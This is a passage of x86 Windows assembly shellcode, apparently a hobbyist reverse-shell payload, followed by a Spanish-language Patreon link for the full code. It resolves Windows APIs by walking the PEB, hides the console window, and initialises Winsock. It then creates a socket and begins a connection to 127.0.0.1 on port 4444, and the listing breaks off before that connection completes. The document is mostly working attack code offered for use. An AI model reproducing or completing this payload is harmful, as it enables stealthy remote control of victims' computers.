;////code by Belial Grimoire////
;///bgpavelang.github.io////

global _start

section .text


_start:


xor ecx, ecx
mov eax, [fs:ecx+0x30]
mov eax, [eax+0xc]
mov esi, [eax+0x14]
lodsd
xchg eax, esi
lodsd
mov ebx, [eax+0x10]

mov edx, [ebx+0x3c]
add edx, ebx
mov edx, [edx+0x78]
add edx, ebx
mov esi, [edx+0x20]
add esi, ebx

push esi
push edx
push esi
push edx

xor ecx, ecx


GPAdd:  

inc ecx
lodsd
add eax, ebx
cmp dword[eax], 0x50746547
jnz GPAdd
cmp dword[eax+4], 0x41636f72
jnz GPAdd
cmp dword[eax+8], 0x65726464
jnz GPAdd

dec ecx

mov esi, [edx+0x24]
add esi, ebx
mov cx, [esi+ecx*2]
mov esi, [edx+0x1c]
add esi, ebx
mov edx, [esi+ecx*4]
add edx, ebx

mov [ebp-4], edx

pop edx
pop esi

xor ecx, ecx

J_Gp:    
inc ecx

lodsd
add eax, ebx
cmp dword[eax], 0x43746547
jnz J_Gp
cmp dword[eax+0x4], 0x6f736e6f
jnz J_Gp
cmp dword[eax+0x8], 0x6957656c
jnz J_Gp
dec ecx

mov esi, [edx+0x24]
add esi, ebx
mov cx, [esi+ecx*2]
mov esi, [edx+0x1c]
add esi, ebx
mov edx, [esi+ecx*4]
add edx, ebx

mov edi, edx
call edi
mov edi, eax  

xor edx, edx
push edx
push 0x41797261 
push 0x7262694c
push 0x64616f4c
push esp
push ebx

call [ebp-4]

mov [ebp-8], eax

xor edx, edx
mov dx, 0x6c6c  
push edx
push 0x642e3233
push 0x72657375
push esp

call [ebp-8]

xor edx, edx

xor ecx, ecx
mov cx, 0x776f
push ecx
push 0x646e6957
push 0x776f6853   
push esp
push eax          

call [ebp-4]      

add esp, 0x28

xor ecx, ecx
push ecx
push edi

call eax


xor edx, edx
mov dx, 0x6c6c
push edx
push 0x642e3233
push 0x5f327377 
push esp

call [ebp-8]

mov esi, eax

add esp, 0xc

xor ecx, ecx
push ecx
mov cx, 0x7075
push ecx
push 0x74726174
push 0x53415357   
push esp
push esi          

call [ebp-4]     

add esp, 0x10

xor ecx, ecx
mov cx, 0x0190
sub esp, ecx
push esp
push ecx

call eax

xor ecx, ecx
mov cx, 0x4174
push ecx
push 0x656b636f
push 0x53415357  
push esp
push esi          

call [ebp-4]      

xor edx, edx
xor ecx, ecx
push edx        
push edx        
push edx        
mov dl, 6       
push edx
inc ecx
push ecx        
inc ecx
push ecx        

call eax

mov edi, eax

brincar:
xor ecx, ecx
mov ecx, 0x74636565
shr ecx, 8
push ecx
push 0x6e6e6f63    
push esp
push esi           
      
call [ebp-4]       

add esp, 0x14

xor ecx, ecx
push 0x0100007f     
push word 0x5c11    
add cl, 2   
push word cx        

xor ecx, ecx
mov ecx, esp


Código completo en...
https://www.patreon.com/BGPavelAng
Ayudame a seguir haciendo más de esto.

